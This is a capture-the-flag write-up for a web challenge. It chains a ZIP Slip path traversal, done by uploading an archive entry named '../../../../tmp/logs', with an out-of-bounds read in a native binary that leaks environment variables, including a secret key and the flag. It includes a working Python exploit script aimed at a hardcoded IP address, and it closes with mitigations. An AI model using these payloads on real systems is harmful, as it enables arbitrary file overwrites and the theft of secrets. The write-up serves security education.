---
layout: writeup
title: "Say My Name"
challenge: "Say My Name"
category: "Web"
difficulty: "Hard"
tags: [zip-slip, path-traversal, oob-read, memory-leak, flask]
---

# Challenge Overview

**Say My Name** is a web exploitation challenge targeting a Flask application hosted at `http://98.70.28.76:8000/`. The objective is to chain two vulnerabilities — a **ZIP Slip path traversal** and an **out-of-bounds memory read** in a native binary — to leak environment variables containing the flag.

<div class="flag-box">KICTF{stay_out_of_my_t3rr1t0ry}</div>

---

## Initial Recon

The target is a Python Flask (Werkzeug) web application. Initial enumeration reveals:

- `/supply_manifest` — accepts ZIP file uploads
- `/telemetry` — triggers `/app/bin/healthcheck` binary
- `/rv_terminal` — returns 403 Forbidden
- Session cookies set by Werkzeug

```
$ curl -v http://98.70.28.76:8000/
< Server: Werkzeug/2.x Python/3.x
< Set-Cookie: session=...
```

---

## Vulnerability / Weakness

Two chained vulnerabilities:

1. **ZIP Slip (CWE-22):** The `/supply_manifest` endpoint extracts uploaded ZIP files without validating entry paths. Filenames containing `../` traverse outside the intended directory, allowing arbitrary file writes.

2. **Out-of-Bounds Index (CWE-125):** The native `/app/bin/healthcheck` binary reads `service_id` values from `/tmp/logs` and uses them as array indices without bounds checking. Out-of-range indices leak adjacent memory — including environment variable strings.

```
┌──────────────────────────────────────────────────────────┐
│                    ATTACK FLOW                           │
├──────────────────────────────────────────────────────────┤
│                                                          │
│  ┌─────────────┐    ZIP Slip    ┌──────────────────┐    │
│  │ Attacker    │───────────────>│ /supply_manifest │    │
│  │ crafts ZIP  │  ../../../tmp/ │ extracts to      │    │
│  │ with path   │  logs payload  │ /tmp/logs         │    │
│  └─────────────┘                └──────────────────┘    │
│         │                              │                 │
│         │                              ▼                 │
│         │                       ┌──────────────────┐    │
│         │                       │ /tmp/logs now     │    │
│         │                       │ contains crafted  │    │
│         │                       │ service_id values │    │
│         │                       └──────────────────┘    │
│         │                              │                 │
│         ▼                              ▼                 │
│  ┌─────────────┐    OOB Read   ┌──────────────────┐    │
│  │ GET         │──────────────>│ healthcheck      │    │
│  │ /telemetry  │  service_id   │ reads /tmp/logs   │    │
│  │             │  as array idx │ leaks env memory  │    │
│  └─────────────┘               └──────────────────┘    │
│         │                              │                 │
│         ▼                              ▼                 │
│  ┌──────────────────────────────────────────────┐       │
│  │ Response contains leaked env vars:           │       │
│  │   id=27 → FLASK_SECRET_KEY                   │       │
│  │   id=39 → FLAG=KICTF{stay_out_of_my_...}    │       │
│  └──────────────────────────────────────────────┘       │
└──────────────────────────────────────────────────────────┘
```

---

## Exploitation Strategy

1. **Craft malicious ZIP** with an entry named `../../../../tmp/logs` containing custom `service_id` values
2. **Upload** via `/supply_manifest` to overwrite `/tmp/logs`
3. **Trigger** `/telemetry` which invokes the healthcheck binary
4. **Scan** `service_id` values 3–60 to find OOB leaks
5. **Parse** response for `FLAG=` pattern

---

## Exploitation Walkthrough

### Step 1: Craft the ZIP Slip Payload

```python
import zipfile
import io

def create_zip_slip(service_ids):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        # Path traversal to overwrite /tmp/logs
        payload = "\n".join(str(sid) for sid in service_ids)
        zf.writestr("../../../../tmp/logs", payload)
    return buf.getvalue()
```

### Step 2: Upload and Trigger

```python
import requests

BASE = "http://98.70.28.76:8000"
s = requests.Session()

for service_id in range(3, 61):
    # Craft ZIP with single service_id
    zip_data = create_zip_slip([service_id])
    
    # Upload via ZIP Slip
    s.post(f"{BASE}/supply_manifest",
           files={"manifest": ("manifest.zip", zip_data)})
    
    # Trigger healthcheck binary
    r = s.get(f"{BASE}/telemetry")
    
    if "KICTF" in r.text or "FLAG" in r.text:
        print(f"[+] service_id={service_id}: {r.text}")
```

### Step 3: Extract the Flag

```
[+] service_id=27: FLASK_SECRET_KEY=<redacted>
[+] service_id=39: FLAG=KICTF{stay_out_of_my_t3rr1t0ry}
```

---

## Flag Extraction

The flag was extracted from the environment variable leaked at `service_id=39`:

```
FLAG=KICTF{stay_out_of_my_t3rr1t0ry}
```

Confirmed independently across two separate exploit runs.

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""Say My Name - ZIP Slip + OOB Memory Leak Exploit"""

import io
import re
import zipfile
import requests

BASE = "http://98.70.28.76:8000"

def create_zip_slip(content):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr("../../../../tmp/logs", content)
    return buf.getvalue()

def exploit():
    s = requests.Session()
    
    for sid in range(3, 61):
        zip_data = create_zip_slip(str(sid))
        s.post(f"{BASE}/supply_manifest",
               files={"manifest": ("m.zip", zip_data)})
        r = s.get(f"{BASE}/telemetry")
        
        flag = re.search(r'KICTF\{[^}]+\}', r.text)
        if flag:
            print(f"[+] FLAG @ service_id={sid}: {flag.group()}")
            return flag.group()
    
    print("[-] Flag not found")

if __name__ == "__main__":
    exploit()
```

---

## Lessons Learned

- **ZIP Slip** remains a common vulnerability in file upload handlers. The path entry names inside ZIP archives must be sanitized before extraction.
- **Native binaries** called by web applications introduce a separate attack surface. The healthcheck binary trusted untrusted input as an array index, leaking adjacent memory.
- **Environment variables** are a dangerous storage location for secrets in containerized applications — memory disclosure vulnerabilities make them trivially exfiltrable.

---

## Defensive Takeaways

| Vulnerability | Mitigation |
|---|---|
| ZIP Slip | Validate and normalize ZIP entry paths; reject entries containing `../` |
| OOB Read | Bounds-check all array indices; use safe array access patterns |
| Env secrets | Use dedicated secret management (Vault, AWS SSM); never store flags in env vars |
| Native binary trust | Sanitize all inputs passed to native binaries from web layer |
